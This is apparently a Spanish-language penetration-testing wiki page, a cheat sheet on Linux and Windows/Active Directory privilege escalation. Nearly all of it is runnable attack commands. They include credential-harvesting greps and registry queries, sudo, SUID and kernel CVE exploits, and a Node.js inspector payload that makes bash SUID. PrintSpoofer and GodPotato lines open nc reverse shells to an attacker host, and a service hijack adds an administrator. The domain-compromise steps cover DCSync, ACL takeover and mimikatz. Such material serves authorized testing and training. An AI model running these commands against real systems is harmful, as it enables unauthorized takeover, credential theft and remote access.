---
title: Escalación de privilegios (Linux + Windows)
slug: privilege-escalation
category: techniques
updated: 2026-07-26
summary: "Linux + Windows/AD privesc chains, Node.js inspect, pillaging, real-world gotchas"
tags: [privesc, linux, windows, sudo, suid, ad, tokens]
sensitive: false
---

# Escalación de privilegios (Linux + Windows)

## When to use
Tras conseguir un shell de bajo privilegio. **Pillaging SIEMPRE antes de privesc.** Cualquier binario raro en `sudo -l` o `whoami /priv` → buscar en GTFOBins/tabla antes de pensar en kernel exploits.

## Conciencia situacional
```bash
# Linux
id; whoami; hostname; uname -a; cat /etc/os-release
ip a; ss -tlnp; cat /etc/hosts; ps aux
systemctl list-units --type=service --state=running
```
```cmd
REM Windows
whoami /all & whoami /priv & net localgroup administrators
systeminfo & ipconfig /all & netstat -ano & tasklist /svc
```

## Pillaging (antes de privesc) — incluye CACHÉS DE APPS, no solo .txt
Credenciales suelen estar en sesiones de apps (Sublime `Session.sublime_session`), Rocket.Chat, stores Psi-im (LaZagne), y campos LDAP `description/info/comment`. Revisa `~/.config` y `%AppData%`.
```bash
grep -rniE 'password|passwd|secret|api_key' /home /opt /var /etc /tmp 2>/dev/null
find / \( -name id_rsa -o -name '*.kdbx' -o -name '*.ovpn' -o -name .env -o -name '*.bak' \) 2>/dev/null
cat ~/.bash_history ~/.ssh/authorized_keys; sudo -l; cat /etc/crontab
```
```powershell
cmdkey /list; reg query HKLM /f password /t REG_SZ /s
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
netsh wlan show profile name="PROFILE" key=clear
```

## Linux — vectores en orden
| Paso | Check | Explotación |
|---|---|---|
| Sudo | `sudo -l` | `sudo BINARY` (GTFOBins); `sudo csvtool call '/bin/sh;false' /etc/hostname` |
| Sudo CVE | versión | CVE-2019-14287: `sudo -u#-1 /bin/bash`; CVE-2021-3156: `sudoedit -s /` |
| SUID/SGID | `find / -perm -4000 -type f 2>/dev/null` | `find . -exec /bin/bash -p \; -quit`; `cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p`; pkexec=CVE-2021-4034 |
| Capabilities | `getcap -r / 2>/dev/null` | `python3 cap_setuid+ep` → `os.setuid(0);os.system("/bin/bash")` |
| Cron | `cat /etc/crontab`; pspy64 | script escribible → `echo 'chmod +s /bin/bash' >> script.sh`; python import hijack |
| Writable | `find / -writable -type f 2>/dev/null` | `/etc/passwd` (openssl passwd -1), `/etc/sudoers`, LD_PRELOAD si en env_keep |
| Node.js inspect | `ps aux \| grep inspect` | proceso con `--inspect` como root → attach + `process.binding('spawn_sync').call(0,'chmod',['+s','/bin/bash'],...)` |
| Kernel | `uname -a` | DirtyCow, PwnKit, DirtyPipe (5.8–5.16.11) |
| Auto | — | linpeas.sh / LinEnum.sh (último recurso) |

### Node.js --inspect privesc (cuando corre como root)
```bash
# Detectar proceso Node.js con --inspect
ps aux | grep '\-\-inspect'
ss -tlnp | grep '9229\|9230'   # puerto default del inspector

# Explotar desde shell de bajo privilegio:
node -e "const net=require('net');const s=net.connect(9229,()=>{s.write(JSON.stringify({id:1,method:'Runtime.evaluate',params:{expression:'require(\"child_process\").execSync(\"chmod +s /bin/bash\")'}}));})"

# Alternativa: node-inspector / chrome://inspect → Sources → eval
# Post-exploit:
/bin/bash -p   # SUID bash → root
```

## Windows — Token Privileges
| Privilege | Herramienta |
|---|---|
| SeImpersonate / SeAssignPrimaryToken | PrintSpoofer, GodPotato, JuicyPotato (<2019) |
| SeTcbPrivilege | binario C++ custom (`LsaLogonUser`) → SYSTEM |
| SeBackup | `reg save HKLM\SAM`/`SYSTEM`/`SECURITY` → secretsdump LOCAL |
| SeDebug | mimikatz (LSASS) |
```cmd
.\PrintSpoofer.exe -c "nc.exe KALI 4444 -e cmd"
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe KALI 4444 -e cmd.exe"
REM SCM mata el shell a 30s (Err 1053) → desacoplar con WMI:
wmic process call create "C:\Temp\payload.exe"
```

## Windows — servicios, MSI, AD
```cmd
REM Unquoted / weak-perm / binPath hijack (Server Operators puede en el propio DC)
sc.exe config VGAuthService binPath= "cmd /c net localgroup administrators hacker /add"
sc.exe stop VGAuthService & sc.exe start VGAuthService
REM OPSEC: restaurar binPath original o rompes el DC; elegir servicio NO esencial
```
```bash
# AD: cadena ACL desde Kali (sin tocar DC)
bloodyAD -u U -p P -d DOMAIN --dc-ip IP set password TARGET 'Hacked123!'   # ForceChangePassword
dacledit.py -action write -rights FullControl -principal U -target 'DC01$' 'DOMAIN/U:PASS'  # WriteDacl→DCSync
impacket-secretsdump 'DOMAIN/U:PASS'@DC_IP -just-dc-ntlm
certipy-ad find -u U@DOMAIN -p PASS -dc-ip IP -vulnerable   # AD CS ESC1/ESC8
```

## Gotchas
- `sudo -l` con binario raro → GTFOBins ANTES de kernel exploits.
- SCM mata shells de privesc a los 30s (Error 1053) → lanzar con WMI para sobrevivir.
- AD: `WriteDacl "sobre CN=Users"` en BloodHound puede ser realmente sobre `DC01$` — confirma el nodo en Node Info.
- `adminCount=1` (AdminSDHolder) revierte ACLs cada 60 min; úsalas como origen, no como destino.
- LDAP Deleted Objects: control `-E '!1.2.840.113556.1.4.417=:'`, bind en UPN, sin proxychains con Ligolo.
- Cross-forest: el trust da auth, la RUTA (Ligolo dual-NIC) da el paquete.

## References
- Relacionado: [[gtfobins-binaries]], [[bad-epoll-privesc]], [[reverse-shells]], [[active-directory-attacks]], [[windows-nssm-job-escape]], [[windows-sedebugprivilege-migrate]]
- 01_ESCALACION_PRIVILEGIOS.md
- Notas de lab: Node.js --inspect privesc.
- Notas de lab: SeBackupPrivilege abuse.
- Notas de lab interno: csvtool sudo.
